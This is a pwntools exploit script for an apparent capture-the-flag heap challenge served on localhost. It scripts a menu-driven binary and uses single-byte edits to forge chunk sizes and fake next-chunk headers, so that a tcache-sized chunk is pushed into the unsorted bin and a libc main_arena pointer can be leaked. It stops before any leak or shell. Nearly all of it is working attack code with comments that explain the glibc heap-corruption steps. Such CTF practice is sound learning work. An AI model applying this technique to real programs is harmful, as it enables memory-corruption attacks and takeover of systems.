from pwn import *



binpath = './pwn'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']


elf = ELF(binpath)
libc = elf.libc


gdbscript = '''
pwn
# b *0x400df1
# ignore 1 100
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('localhost', 4088)


def debug(func):
    def wrapper(*args, **kwargs):
        print "{}({}, {})".format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


@debug
def alloc(size, data):
    io.recvuntil('> ')
    io.sendline('1')

    io.recvuntil('size: ')
    io.sendline(str(size))

    io.recvuntil('data: ')
    io.sendline(data[:size])


@debug
def edit(index, byte):
    io.recvuntil('> ')
    io.sendline('2')

    io.recvuntil('index: ')
    io.sendline(str(index))

    io.recvuntil('byte: ')
    io.sendline(str(byte))


@debug
def print_name():
    io.recvuntil('> ')
    io.sendline('4')

    io.recvuntil('pwner: ')
    name = io.recvline().rstrip('\n')

    return name


@debug
def delete():
    io.recvuntil('> ')
    io.sendline('3')


io.recvuntil('name: ')
io.sendline('hoge')

alloc(0x58, 'A' * 0x8)
delete()
alloc(0x68, 'B' * 0x8)
delete()

alloc(0x58, '\x00')
# these edits will overwrite the size of the chunk that will be allocated at alloc(0x68, 'C' * 0x8)
# from 0x70 to 0x500, which will not fit into tcache bins.
edit(0x58, 0x01)
edit(0x58 + 1, 0x05)


# size of fake next chunk
edit(0x58 + 0x500, 0x71)

# the PREV_IN_USE in 0x71 is telling that the next chunk of alloc(0x68, 'C' * 0x8)
# is used, so there is no need for unlink.
# if the 0x71 is 0x70 here the unlink procedure is called and the program fails
edit(0x58 + 0x500 + 0x70, 0x71)

# link fake sized chunk to unsorted bins
alloc(0x68, 'C' * 8)
delete()
# now there will be address to main_arena in heap area
# which can be leaked by overwriting _IO_write_ptr

io.interactive()
